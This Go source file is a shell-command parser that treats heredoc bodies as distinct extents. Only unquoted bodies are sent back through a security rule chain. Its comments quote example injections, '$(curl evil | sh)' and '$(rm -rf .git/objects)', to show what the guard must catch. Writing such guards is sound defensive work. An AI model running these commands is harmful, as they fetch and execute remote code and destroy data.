package cmdparse

import "strings"

// Heredoc extents, made FIRST-CLASS in the parser (pg2-r2rf3).
//
// splitCompound splits a command body on '\n', so before this pass a heredoc BODY
// was shredded into pseudo-leaves: every line of what is merely DATA became its own
// "command", and prose like `the .git/index is 0 bytes` was handed to the rule chain
// as a command whose executable is `the`. That was masked downstream by
// engine.EvaluateExpression early-returning Abstain on the first HasHeredoc leaf —
// but that early return fired on the FIRST heredoc leaf and DISCARDED any decision an
// earlier leaf had already produced, so `grep <gitmeta> x && cat <<EOF` and
// `cat <<EOF && grep <gitmeta> x` reached different verdicts for the same pair of
// operations. A security decision cannot depend on which side of `&&` a heredoc sits
// on.
//
// The fix is structural: stripHeredocBodies removes each heredoc's body (and its
// terminator line) from the text BEFORE splitCompound ever sees it, and records the
// extent on the owning leaf. Body text therefore reaches neither splitCompound (no
// pseudo-leaves) nor tokenize (no pseudo-ARGS either — the second half of the same
// defect: a body line naming a path would otherwise land in Args and be judged as an
// operand).
//
// QUOTED vs UNQUOTED delimiters are not cosmetic, they decide whether the body is
// executable text:
//
//   - `<<'EOF'` / `<<"EOF"` / `<<\EOF` — ANY quoting of ANY part of the delimiter word
//     makes the body ENTIRELY LITERAL. bash performs no expansion, so a `$(...)` in
//     the body is inert data and MUST NOT be evaluated (evaluating it manufactures
//     false positives out of prose, e.g. a bug report quoting a shell command).
//   - `<<EOF` — the body undergoes parameter expansion AND command substitution, so a
//     `$(curl evil | sh)` in the body genuinely EXECUTES and MUST still be evaluated.
//
// Getting that backwards either misses a real injection or invents a false positive,
// so Quoted is recorded per heredoc and the engine recurses only the unquoted bodies
// (see ParsedCommand.UnquotedHeredocBodies).
type Heredoc struct {
	// Delimiter is the delimiter word with its quoting REMOVED — the text a
	// terminator line must equal.
	Delimiter string
	// Quoted reports that the delimiter word carried quoting, i.e. the body is
	// literal and undergoes NO expansion.
	Quoted bool
	// StripTabs is the `<<-` form: leading TABS are stripped from body lines and,
	// load-bearing here, from the terminator line — so an indented terminator is
	// still recognised and the body extent does not run to end of input.
	StripTabs bool
	// Body is the body text verbatim (the terminator line excluded), exactly as it
	// appeared in the source.
	Body string
	// Terminated reports that a terminator line was found. An UNTERMINATED heredoc
	// swallows the rest of the input as body — the safe direction, since the
	// alternative is shredding those lines back into commands.
	Terminated bool
}

// heredocMetachars are the unquoted bytes that end a heredoc delimiter word.
func isHeredocWordEnd(c byte) bool {
	switch c {
	case ' ', '\t', '\n', ';', '&', '|', '<', '>', '(', ')':
		return true
	}
	return false
}

// atWordStart reports whether s[i] begins a word — the condition under which an
// unquoted '#' starts a bash comment.
//
// It MUST agree with splitCompound's rule, which is `i == 0 || buf.Len() == 0 ||
// isSpace(s[i-1])`: buf is empty at the start of input, after any separator (';', '&',
// '|', '\n', and so '&&'/'||' too) and after a CLOSED SUBSHELL group, which
// splitCompound flushes. ')' is therefore in this set — omitting it made the extent
// pass read the '#' of `(<)#<<0` as ordinary text and open a phantom heredoc that
// splitCompound (correctly seeing a comment) never claimed (fuzz-found).
func atWordStart(s string, i int) bool {
	if i == 0 {
		return true
	}
	switch s[i-1] {
	case ' ', '\t', '\n', ';', '&', '|', '(', ')':
		return true
	}
	return false
}

// parseHeredocOperator parses the `<<[-]DELIM` operator token assumed to start at
// s[i] (s[i:i+2] == "<<", never "<<<"), returning the Heredoc it opens and the offset
// just past the delimiter word. ok is false when no delimiter word follows, in which
// case the `<<` is not a heredoc operator and must be copied through untouched.
//
// bash allows whitespace between the operator and the word (`<< EOF`), the
// tab-stripping `<<-` form, and quoting of any part of the word (`<<'E'OF`,
// `<<"EOF"`, `<<\EOF`) — each of which makes the whole body literal.
func parseHeredocOperator(s string, i int) (hd Heredoc, end int, ok bool) {
	n := len(s)
	j := i + 2 // past "<<"
	if j < n && s[j] == '-' {
		hd.StripTabs = true
		j++
	}
	for j < n && (s[j] == ' ' || s[j] == '\t') {
		j++
	}
	var word strings.Builder
	inSingle, inDouble := false, false
	for j < n {
		c := s[j]
		if inSingle {
			if c == '\'' {
				inSingle = false
			} else {
				word.WriteByte(c)
			}
			j++
			continue
		}
		if c == '\\' && j+1 < n {
			hd.Quoted = true
			word.WriteByte(s[j+1])
			j += 2
			continue
		}
		if c == '\'' && !inDouble {
			inSingle, hd.Quoted = true, true
			j++
			continue
		}
		if c == '"' {
			inDouble, hd.Quoted = !inDouble, true
			j++
			continue
		}
		if !inDouble && isHeredocWordEnd(c) {
			break
		}
		word.WriteByte(c)
		j++
	}
	if word.Len() == 0 {
		return Heredoc{}, i, false
	}
	hd.Delimiter = word.String()
	return hd, j, true
}

// readHeredocBody returns hd's body starting at offset from (the first byte of the
// first body line), the offset of the '\n' that ends the TERMINATOR line (or len(s)
// when unterminated), and whether a terminator was found.
func readHeredocBody(s string, from int, hd Heredoc) (body string, termEnd int, terminated bool) {
	n := len(s)
	if from >= n {
		return "", n, false
	}
	for lineStart := from; lineStart <= n; {
		lineEnd := n
		if rel := strings.IndexByte(s[lineStart:], '\n'); rel >= 0 {
			lineEnd = lineStart + rel
		}
		line := s[lineStart:lineEnd]
		if hd.StripTabs {
			line = strings.TrimLeft(line, "\t")
		}
		if line == hd.Delimiter {
			return s[from:lineStart], lineEnd, true
		}
		if lineEnd >= n {
			break
		}
		lineStart = lineEnd + 1
	}
	return s[from:n], n, false
}

// stripHeredocBodies removes every TOP-LEVEL heredoc BODY (plus its terminator line)
// from s and returns the remaining text together with the heredocs in SOURCE ORDER.
// The `<<[-]DELIM` operator token itself is left in place, so extractRedirections
// still recognises the leaf as heredoc-bearing exactly as before.
//
// TOP-LEVEL means: where the shared shellScanner declines the byte — outside quotes
// and outside `$(...)`. A heredoc INSIDE a command substitution
// (`PAYLOAD=$(cat <<'EOF' … EOF)`) is deliberately left glued into its substitution
// token: the whole `$(...)` is already inert to splitCompound, and the engine strips
// that body when it recurses the substitution body through Parse.
//
// Bash's grammar puts the body AFTER the operator LINE, not after the operator, so
// the rest of the operator line stays live shell syntax (`cat <<EOF | grep x` still
// splits at the pipe) and MULTIPLE heredocs on one line consume consecutive bodies in
// operator order (`cat <<A <<B`). Comments are copied through uninterpreted, so a
// `<<` inside a comment cannot open a heredoc and swallow the following real command
// lines.
func stripHeredocBodies(s string) (string, []Heredoc) {
	masked, hds, _ := scanHeredocs(s)
	return masked, hds
}

// heredocSpan is the SOURCE byte range one heredoc occupies after its operator line:
// its body plus its terminator line. end is the offset of the '\n' that closes the
// terminator line (or len(s)), so a line whose start offset lies in [start, end] is
// heredoc content rather than shell syntax.
type heredocSpan struct {
	start int
	end   int
}

// scanHeredocs is stripHeredocBodies plus the source spans, for callers that must
// classify positions in the ORIGINAL text (StripCommentsPreservingHeredocs) rather
// than consume the masked text.
func scanHeredocs(s string) (string, []Heredoc, []heredocSpan) {
	if !strings.Contains(s, "<<") {
		return s, nil, nil
	}
	var out strings.Builder
	out.Grow(len(s))
	var hds []Heredoc
	var spans []heredocSpan
	var pending []int // indexes into hds awaiting a body
	// escapeUnquoted=true matches splitCompound: a bare `\(` is not a subshell.
	sc := newShellScanner(true)
	i, n := 0, len(s)
	for i < n {
		if k := sc.advance(s, i); k > 0 {
			out.WriteString(s[i : i+k])
			i += k
			continue
		}
		c := s[i]
		if c == '#' && atWordStart(s, i) {
			for i < n && s[i] != '\n' {
				out.WriteByte(s[i])
				i++
			}
			continue
		}
		if c == '<' && strings.HasPrefix(s[i:], "<<") {
			// `<<<` is a HERESTRING: its word sits on this same line, there is no
			// body. Copy all three bytes so the trailing `<<` is not rescanned as a
			// heredoc operator.
			if strings.HasPrefix(s[i:], "<<<") {
				out.WriteString(s[i : i+3])
				i += 3
				continue
			}
			if hd, end, ok := parseHeredocOperator(s, i); ok {
				out.WriteString(s[i:end])
				hds = append(hds, hd)
				pending = append(pending, len(hds)-1)
				i = end
				continue
			}
			out.WriteString(s[i : i+2]) // no delimiter word — not a heredoc
			i += 2
			continue
		}
		if c == '\n' && len(pending) > 0 {
			out.WriteByte('\n') // the operator line's newline stays a live separator
			j := i + 1
			for k, idx := range pending {
				body, termEnd, terminated := readHeredocBody(s, j, hds[idx])
				hds[idx].Body = body
				hds[idx].Terminated = terminated
				spans = append(spans, heredocSpan{start: j, end: termEnd})
				if k < len(pending)-1 && termEnd < n {
					j = termEnd + 1 // next body starts after this terminator line
				} else {
					j = termEnd // leave the trailing '\n' as a live separator
				}
			}
			pending = nil
			i = j
			continue
		}
		out.WriteByte(c)
		i++
	}
	return out.String(), hds, spans
}

// StripCommentsPreservingHeredocs applies the per-LINE comment strip that the engine's
// expression pre-pass needs, while leaving every line inside a heredoc BODY untouched.
//
// A '#' inside a heredoc body is not a comment — the body is data. Stripping it anyway
// silently deleted text from the body, and for an UNQUOTED (expanding) heredoc that
// text can be a live command substitution: `cat <<EOF` with `# $(rm -rf .git/objects)`
// in its body lost the substitution before the parser ever saw it, so the injection was
// never evaluated and its Reject was dropped. Because the heredoc-bearing leaf is
// floored at Abstain the failure could not reach `allow` — but silently dropping a
// Reject is precisely the "guard quietly stopped applying" class this bead exists to
// remove, so the extent must be honored here too.
//
// The terminator line is preserved verbatim as well; mangling it would move the end of
// the extent and swallow the commands that follow.
func StripCommentsPreservingHeredocs(expr string) string {
	_, _, spans := scanHeredocs(expr)
	inHeredoc := func(lineStart int) bool {
		for _, sp := range spans {
			if lineStart >= sp.start && lineStart <= sp.end {
				return true
			}
		}
		return false
	}
	var out strings.Builder
	out.Grow(len(expr))
	for lineStart := 0; ; {
		lineEnd := len(expr)
		if rel := strings.IndexByte(expr[lineStart:], '\n'); rel >= 0 {
			lineEnd = lineStart + rel
		}
		line := expr[lineStart:lineEnd]
		if inHeredoc(lineStart) {
			out.WriteString(line)
		} else {
			out.WriteString(StripComment(line))
		}
		if lineEnd >= len(expr) {
			break
		}
		out.WriteByte('\n')
		lineStart = lineEnd + 1
	}
	return out.String()
}

// countHeredocOperators returns how many heredoc operators a BODY-FREE segment
// carries. Run on a segment splitCompound produced from already-stripped text, every
// operator is pending-with-no-body, so the heredoc count equals the operator count.
// This is how the source-ordered heredoc queue is handed back out to the leaves:
// splitCompound copies content bytes verbatim, so operator order across segments is
// the original source order.
func countHeredocOperators(seg string) int {
	if !strings.Contains(seg, "<<") {
		return 0
	}
	_, hds := stripHeredocBodies(seg)
	return len(hds)
}

// UnquotedHeredocBodies returns the bodies of this leaf's heredocs whose delimiter
// was UNQUOTED — the bodies bash performs parameter expansion and COMMAND
// SUBSTITUTION on, and therefore the only heredoc text that can execute. The engine
// recurses each through the full rule chain, so `cat <<EOF` with `$(curl evil | sh)`
// in its body is still judged, while the same bytes under `cat <<'EOF'` are literal
// data and are never treated as a command.
func (pc ParsedCommand) UnquotedHeredocBodies() []string {
	var out []string
	for _, hd := range pc.Heredocs {
		if hd.Quoted || hd.Body == "" {
			continue
		}
		out = append(out, hd.Body)
	}
	return out
}
